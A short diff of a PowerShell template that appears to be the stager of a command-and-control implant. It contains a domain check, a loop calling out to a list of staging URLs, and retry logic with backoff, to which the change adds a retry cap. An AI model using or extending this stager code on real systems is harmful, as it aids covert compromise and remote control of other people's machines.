@@ -91,9 +91,11 @@ if(![string]::IsNullOrEmpty("#REPLACEMEDOMAIN#") -and ![Environment]::UserDomain
 foreach($url in $urls){
 $index = [array]::IndexOf($urls, $url)
 try {primern $url $curl $df[$index]} catch {write-output $error[0]}}}
+$limit=#REPLACESTAGERRETRIESLIMIT#
 if($#REPLACESTAGERRETRIES#){
     $wait = #REPLACESTAGERRETRIESWAIT#
-    while($true){
+    while($true -and $limit -gt 0){
+        $limit = $limit -1;
         primers
         Start-Sleep $wait
         $wait = $wait * 2;
